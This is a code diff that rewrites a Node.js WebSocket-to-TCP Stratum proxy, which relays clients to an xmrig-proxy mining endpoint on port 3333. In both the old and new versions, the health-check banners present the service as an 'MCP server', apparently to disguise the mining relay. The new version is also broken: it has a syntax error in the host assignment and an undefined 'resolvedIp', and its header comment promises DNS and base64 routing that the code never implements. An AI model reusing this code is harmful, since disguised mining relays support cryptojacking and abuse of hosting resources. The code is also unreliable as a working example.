@@ -1,35 +1,33 @@
-import uWS from "uWebSockets.js";
-import net from "net";
-import { spawn } from "child_process";
+#!/usr/bin/env node
+/**
+ * WebSocket to TCP Stratum Proxy with DNS Resolution
+ * Dynamic target pool via base64 URL:
+ * ws://IP:PORT/base64(host:port)
+ */
+const WebSocket = require('ws');
+const net = require('net');
+const http = require('http');
+const dns = require('dns').promises;
 
-const PORT = 8080;
-const XMRIG_PROXY_HOST = "localhost";
-const XMRIG_PROXY_PORT = 3333;
-const app = uWS.App();
+// Configuration
+const WS_PORT = 8080;
 
-// Cấu hình giới hạn
-const MAX_QUEUE_SIZE = 1000;           // tối đa 1000 message trong queue
-const MAX_PAYLOAD_LENGTH = 1024 * 1024; // 1MB WebSocket payload
-const IDLE_TIMEOUT_SECONDS = 300;      // 5 phút
+// Create HTTP server
+const server = http.createServer((req, res) => {
+    res.writeHead(200, { 'Content-Type': 'text/plain' });
+    res.end('WELCOME TO MCP-CLIENT-NODE PUBLIC! FEEL FREE TO USE! \n');
+});
 
-const DEBUG = true;
+// WebSocket server
+const wss = new WebSocket.Server({ 
+    server,
+    perMessageDeflate: false, // Disable compression for performance
+    maxPayload: 100 * 1024, // 100KB max message size
+});
 
-// Chuẩn hóa message: đảm bảo có newline cuối
-function normalizeLine(msg) {
-    const text = typeof msg === "string" ? msg : String(msg);
-    return text.endsWith("\n") ? text : text + "\n";
-}
-
-function safeEndWS(ws, code, reason) {
-    try {
-        if (ws.isClosed) return;
-        if (ws.isOpen) {
-            ws.end(code, reason);
-        }
-    } catch (e) {
-        console.error("Error closing WebSocket:", e);
-    }
-}
+startTcpProxy();
+console.log(`[PROXY] WebSocket listening on port: ${WS_PORT}`);
+console.log(`[PROXY] Ready to accept connections...\n`);
 
 function startTcpProxy() {
     console.log(`Starting tcp endpoint proxy...`);
@@ -49,151 +47,73 @@ function startTcpProxy() {
     });
 }
 
-// HTTP healthcheck
-app.get("/", (res) => {
-    res.writeHeader("Content-Type", "text/plain; charset=utf-8");
-    res.writeHeader("Cache-Control", "no-store");
-    res.end("MCP SERVER STATUS: RUNNING!");
-});
+wss.on('connection', async (ws, req) => {
+    const clientIp = req.socket.remoteAddress;
 
-// WebSocket <-> TCP proxy
-app.ws("/*", {
-    compression: 0,
-    maxPayloadLength: MAX_PAYLOAD_LENGTH,
-    idleTimeout: IDLE_TIMEOUT_SECONDS,
+    const host = "app":
+    const port = "3333";
 
-    upgrade: (res, req, context) => {
+    console.log(`[WS] Connecting from ${clientIp} -> ${host}:${port}`);
+    
+    // --- TCP connect to resolved IP ---
+    const tcpClient = new net.Socket();
+    tcpClient.connect(port, host, () => {
+        console.log(`[TCP] Connected from ${clientIp} -> ${host}:${port}`);
+    });
+    tcpClient.setNoDelay(true);
+    
+    // --- WS → TCP ---
+    ws.on('message', (data) => {
         try {
-            const ip = Buffer.from(res.getRemoteAddressAsText()).toString();
-
-            res.upgrade(
-                {
-                    ip,
-                    isConnected: false,
-                    queue: [],
-                    tcp: null,
-                    tcpHost: `${XMRIG_PROXY_HOST}:${XMRIG_PROXY_PORT}`,
-                },
-                req.getHeader("sec-websocket-key"),
-                req.getHeader("sec-websocket-protocol"),
-                req.getHeader("sec-websocket-extensions"),
-                context
-            );
-        } catch (e) {
-            console.error("Upgrade error:", e);
-            try {
-                res.writeStatus("500 Internal Server Error").end("Upgrade failed");
-            } catch {
-                // ignore
-            }
+            const msg = data.toString();
+            const message = msg.endsWith("\n") ? msg : msg + "\n";
+            tcpClient.write(message);
+        } catch (err) {
+            console.error(`[ERROR] WS→TCP failed:`, err.message);
         }
-    },
-
-    open: (ws) => {
-        const host = XMRIG_PROXY_HOST;
-        const port = XMRIG_PROXY_PORT;
-
-        const clientIp = ws.ip;
-        const tcp = net.createConnection({ host, port });
-        tcp.setTimeout(0);
-        tcp.setKeepAlive(true);
-        tcp.setNoDelay(true);
-
-        ws.isConnected = false;
-        ws.queue = [];
-        ws.tcp = tcp;
-        ws.tcpHost = `${host}:${port}`;
-
-        tcp.on("connect", () => {
-            ws.isConnected = true;
-
-            // flush queue
-            for (const msg of ws.queue) {
-                tcp.write(normalizeLine(msg));
-            }
-            ws.queue.length = 0;
-
-            console.log(`🟢 SUCCESS: WS [${clientIp}] <-> TCP [${host}:${port}]`);
-        });
-
-        tcp.on("data", (data) => {
+    });
+    
+    // --- TCP → WS ---
+    tcpClient.on('data', (data) => {
+        if (ws.readyState === WebSocket.OPEN) {
             try {
-                if (ws.isClosed) return;
-                ws.send(data.toString("utf-8"), false);
+                const text = data.toString();
+                ws.send(text, { binary: false });
             } catch (err) {
-                console.error("WS send failed:", err?.message ?? err);
-            }
-        });
-
-        tcp.on("close", () => {
-            safeEndWS(ws, 1000, "TCP closed");
-        });
-
-        tcp.on("error", (err) => {
-            console.error(`TCP error [${host}:${port}] for WS [${clientIp}]:`, err.message);
-            safeEndWS(ws, 1011, err.message || "TCP error");
-        });
-    },
-
-    // Helper nếu bạn cần gọi từ nơi khác
-    tcpSend: (ws, msg) => {
-        if (!ws.isConnected || !ws.tcp || ws.tcp.destroyed) return;
-        ws.tcp.write(normalizeLine(msg));
-    },
-
-    message: (ws, msg) => {
-        const data = Buffer.from(msg);
-        const text = data.toString("utf-8");
-
-        if (ws.isConnected && ws.tcp && !ws.tcp.destroyed) {
-            ws.tcp.write(normalizeLine(text));
-        } else {
-            if (!Array.isArray(ws.queue)) {
-                ws.queue = [];
-            }
-
-            if (ws.queue.length >= MAX_QUEUE_SIZE) {
-                console.warn(
-                    `Queue overflow for WS [${ws.ip}] -> ${ws.tcpHost || "unknown target"}`
-                );
-                safeEndWS(ws, 1011, "Queue overflow");
-                return;
-            }
-
-            ws.queue.push(text);
-        }
-    },
-
-    close: (ws, code, message) => {
-        const clientIp = ws.ip;
-        const tcpHost = ws.tcpHost;
-
-        if (ws.tcp && !ws.tcp.destroyed) {
-            try {
-                ws.tcp.destroy();
-            } catch (e) {
-                console.error("Error destroying TCP socket:", e);
+                console.error(`[ERROR] TCP→WS:`, err.message);
             }
         }
-
-        // Dọn state
-        ws.isConnected = false;
-        ws.queue = [];
-        ws.tcp = null;
-
-        const reason = Buffer.from(message || "").toString("utf-8") || "no reason";
-        console.log(
-            `🔴 DISCONNECTED: WS [${clientIp}] <-> TCP [${tcpHost}] (code=${code}, reason="${reason}")`
-        );
-    },
+    });
+    
+    // --- Cleanup ---
+    ws.on('close', () => {
+        // console.log(`[WS] Connection closed from ${clientIp}`);
+        tcpClient.end();
+    });
+    
+    ws.on('error', (err) => {
+        // console.error(`[WS ERROR]`, err.message);
+        tcpClient.end();
+    });
+    
+    tcpClient.on('close', () => {
+        console.log(`[TCP] Pool socket closed for ${host} (${resolvedIp}):${port}`);
+        if (ws.readyState === WebSocket.OPEN) ws.close();
+    });
+    
+    tcpClient.on('error', (err) => {
+        console.error(`[TCP ERROR] ${host} (${resolvedIp}):${port}:`, err.message);
+        if (ws.readyState === WebSocket.OPEN) ws.close();
+    });
+    
+    tcpClient.on('timeout', () => {
+        tcpClient.end();
+    });
 });
 
-app.listen("0.0.0.0", PORT, (t) => {
-    if (t) {
-        console.log(`🚀 WS⇄TCP proxy running on port ${PORT}`);
-        console.log(`Forwarding fallback matches to local xmrig-proxy at ${XMRIG_PROXY_HOST}:${XMRIG_PROXY_PORT}`);
-        startTcpProxy();
-    } else {
-        console.error("❌ Failed to listen");
-    }
+wss.on('error', (err) => console.error(`[WSS ERROR]`, err.message));
+
+// Start server
+server.listen(WS_PORT, '0.0.0.0', () => {
+    console.log(`[SERVER] Listening on port ${WS_PORT}`)
 });
